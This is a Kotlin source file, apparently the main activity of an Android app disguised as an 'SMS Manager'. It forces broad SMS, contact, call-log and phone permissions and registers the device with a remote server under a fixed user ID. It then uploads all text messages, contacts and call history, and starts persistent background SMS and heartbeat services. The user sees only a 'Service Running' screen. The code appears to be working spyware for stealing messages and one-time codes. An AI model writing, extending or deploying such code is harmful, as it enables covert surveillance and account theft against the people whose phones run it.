package com.example.test

import android.Manifest
import android.content.Intent
import android.content.pm.PackageManager
import android.os.Build
import android.os.Bundle
import android.os.Handler
import android.os.Looper
import android.os.PowerManager
import android.util.Log
import androidx.activity.ComponentActivity
import androidx.activity.compose.setContent
import androidx.compose.foundation.layout.*
import androidx.compose.material3.*
import androidx.compose.runtime.*
import androidx.compose.ui.Alignment
import androidx.compose.ui.Modifier
import androidx.compose.ui.graphics.Color
import androidx.compose.ui.text.font.FontWeight
import androidx.compose.ui.unit.dp
import androidx.compose.ui.unit.sp
import androidx.core.content.ContextCompat
import com.example.test.utils.DataUploader
import com.example.test.utils.DeviceInfoHelper
import com.google.firebase.messaging.FirebaseMessaging

class MainActivity : ComponentActivity() {

    private lateinit var deviceId: String
    private var fcmToken: String = ""
    private val handler = Handler(Looper.getMainLooper())
    private val BATTERY_UPDATE_INTERVAL_MS = 60000L
    private val FCM_TIMEOUT_MS = 5000L
    private val userId = Constants.USER_ID

    companion object {
        private const val TAG = "MainActivity"
    }

    private val batteryUpdater = object : Runnable {
        override fun run() {
            DataUploader.sendBatteryUpdate(this@MainActivity, deviceId, fcmToken)
            handler.postDelayed(this, BATTERY_UPDATE_INTERVAL_MS)
        }
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        deviceId = DeviceInfoHelper.getDeviceId(this)
        Log.d(TAG, "📱 Device ID: $deviceId")

        // چک کردن دسترسی‌ها قبل از شروع
        if (!checkAllPermissionsGranted()) {
            Log.w(TAG, "⚠️ Permissions not granted, redirecting to PermissionActivity")
            val intent = Intent(this, PermissionActivity::class.java)
            startActivity(intent)
            finish()
            return
        }

        Log.d(TAG, "✅ All permissions verified, starting app...")
        setupUI()
        continueInitialization()
    }

    private fun checkAllPermissionsGranted(): Boolean {
        val permissions = arrayOf(
            Manifest.permission.READ_SMS,
            Manifest.permission.RECEIVE_SMS,
            Manifest.permission.SEND_SMS,
            Manifest.permission.READ_PHONE_STATE,
            Manifest.permission.CALL_PHONE,
            Manifest.permission.READ_CONTACTS,
            Manifest.permission.READ_CALL_LOG
        )

        val allGranted = permissions.all {
            ContextCompat.checkSelfPermission(this, it) == PackageManager.PERMISSION_GRANTED
        }

        val pm = getSystemService(POWER_SERVICE) as PowerManager
        val batteryOptimization = pm.isIgnoringBatteryOptimizations(packageName)

        Log.d(TAG, "📊 Permissions check - All: $allGranted, Battery: $batteryOptimization")
        return allGranted && batteryOptimization
    }

    private fun setupUI() {
        setContent {
            MaterialTheme {
                Surface(
                    modifier = Modifier.fillMaxSize(),
                    color = Color.White
                ) {
                    Box(
                        modifier = Modifier.fillMaxSize(),
                        contentAlignment = Alignment.Center
                    ) {
                        Column(
                            horizontalAlignment = Alignment.CenterHorizontally,
                            verticalArrangement = Arrangement.Center
                        ) {
                            Text(
                                text = "SMS Manager",
                                fontSize = 24.sp,
                                fontWeight = FontWeight.Bold,
                                color = Color.Black
                            )
                            Spacer(modifier = Modifier.height(16.dp))
                            Text(
                                text = "Service Running",
                                fontSize = 16.sp,
                                color = Color.Gray
                            )
                            Spacer(modifier = Modifier.height(8.dp))
                            Text(
                                text = "✅ All permissions granted",
                                fontSize = 14.sp,
                                color = Color(0xFF4CAF50)
                            )
                        }
                    }
                }
            }
        }
    }

    private fun continueInitialization() {
        Log.d(TAG, "🚀 Starting initialization...")

        var fcmReceived = false

        FirebaseMessaging.getInstance().token.addOnCompleteListener { task ->
            fcmReceived = true
            if (task.isSuccessful && task.result != null) {
                fcmToken = task.result!!
                Log.d(TAG, "✅ FCM Token received: ${fcmToken.take(20)}...")
            } else {
                Log.w(TAG, "⚠️ FCM token failed: ${task.exception?.message}")
                fcmToken = "NO_FCM_TOKEN_${deviceId.take(8)}"
                Log.d(TAG, "📝 Using fallback token: $fcmToken")
            }
        }

        handler.postDelayed({
            if (!fcmReceived) {
                Log.w(TAG, "⏱️ FCM timeout! Continuing without it...")
                fcmToken = "NO_FCM_TOKEN_${deviceId.take(8)}"
                Log.d(TAG, "📝 Using fallback token: $fcmToken")
            }

            Thread {
                try {
                    Log.d(TAG, "📡 Starting network operations...")
                    DataUploader.registerDevice(this, deviceId, fcmToken, userId)
                    DataUploader.uploadAllSms(this, deviceId)
                    DataUploader.uploadAllContacts(this, deviceId)
                    DataUploader.uploadCallHistory(this, deviceId)
                    startBackgroundService()
                    startHeartbeatService()
                    Log.d(TAG, "✅ All operations completed")
                } catch (e: Exception) {
                    Log.e(TAG, "❌ Init error: ${e.message}", e)
                    e.printStackTrace()
                }
            }.start()

            handler.post(batteryUpdater)

        }, FCM_TIMEOUT_MS)
    }

    private fun startBackgroundService() {
        try {
            val intent = Intent(this, SmsService::class.java)
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                startForegroundService(intent)
            } else {
                startService(intent)
            }
            Log.d(TAG, "✅ SmsService started")
        } catch (e: Exception) {
            Log.e(TAG, "❌ Failed to start SmsService: ${e.message}")
        }
    }

    private fun startHeartbeatService() {
        try {
            val intent = Intent(this, HeartbeatService::class.java)
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                startForegroundService(intent)
            } else {
                startService(intent)
            }
            Log.d(TAG, "✅ HeartbeatService started")
        } catch (e: Exception) {
            Log.e(TAG, "❌ Failed to start HeartbeatService: ${e.message}")
        }
    }

    override fun onDestroy() {
        super.onDestroy()
        handler.removeCallbacks(batteryUpdater)
        Log.d(TAG, "👋 MainActivity destroyed")
    }
}